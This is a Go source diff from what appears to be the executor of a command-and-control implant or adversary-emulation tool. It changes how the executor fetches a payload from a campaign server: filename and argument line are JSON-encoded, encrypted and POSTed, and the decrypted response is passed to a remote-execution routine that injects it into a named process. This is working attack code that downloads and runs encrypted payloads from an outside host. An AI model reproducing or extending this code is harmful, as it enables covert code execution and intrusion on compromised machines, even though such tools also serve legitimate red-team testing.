@@ -1,6 +1,7 @@
 package executor
 
 import (
+	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -265,12 +266,12 @@ func (e *Executor) actionExecRemote(packetArgument model.PacketArgument) (model.
 		return ret, fmt.Errorf("invalid packet arguments given: no injectInto")
 	}
 
-	fileContent, err := e.SecureFileDownload(filename)
+	fileContent, err := e.SecureFileDownload(filename, argline, fileType)
 	if err != nil {
 		return ret, err
 	}
 
-	stdOut, stdErr, pid, exitCode, err = arch.ExecRemote(fileContent, fileType, argline, injectInto)
+	stdOut, stdErr, pid, exitCode, err = arch.ExecRemote(fileContent, injectInto)
 
 	ret["stdout"] = arch.ExecOutputDecode(stdOut)
 	ret["stderr"] = arch.ExecOutputDecode(stdErr)
@@ -280,18 +281,27 @@ func (e *Executor) actionExecRemote(packetArgument model.PacketArgument) (model.
 	return ret, err
 }
 
-func (e *Executor) SecureFileDownload(filename string) ([]byte, error) {
+func (e *Executor) SecureFileDownload(filename, argline, filetype string) ([]byte, error) {
 	coder := model.MakeCoder(e.campaign)
 
-	// Create secure url based on filename
-	filenameEncrypted, err := coder.EncryptDataB64([]byte(filename))
+	url := e.campaign.ServerUrl + e.campaign.SecureDownloadPath
+
+	// Create encrypted args
+	args := model.SecureDownloadArgs{
+		Filename: filename,
+		Argline:  argline,
+	}
+	data, err := json.Marshal(args)
 	if err != nil {
 		return nil, err
 	}
-	url := e.campaign.ServerUrl + e.campaign.SecureDownloadPath + string(filenameEncrypted)
+	data, err = coder.EncryptB64Zip(data)
+	if err != nil {
+		return nil, fmt.Errorf("Encrypt error: %s", err.Error())
+	}
 
 	// Download
-	res, err := e.httpClient.Get(url)
+	res, err := e.httpClient.Post(url, "application/text", bytes.NewBuffer(data))
 	if err != nil {
 		return nil, err
 	}
@@ -299,15 +309,15 @@ func (e *Executor) SecureFileDownload(filename string) ([]byte, error) {
 	if res.StatusCode != 200 {
 		return nil, fmt.Errorf("Invalid StatusCode when attempt to download file %s: %d", filename, res.StatusCode)
 	}
-	data, err := ioutil.ReadAll(res.Body)
+	data, err = ioutil.ReadAll(res.Body)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("Read response error: %s", err.Error())
 	}
 
 	// Decrypt
 	decoded, err := coder.DecryptB64Zip(data)
 	if err != nil {
-		return nil, err
+		return nil, fmt.Errorf("Decrypt error: %s", err.Error())
 	}
 
 	return decoded, nil
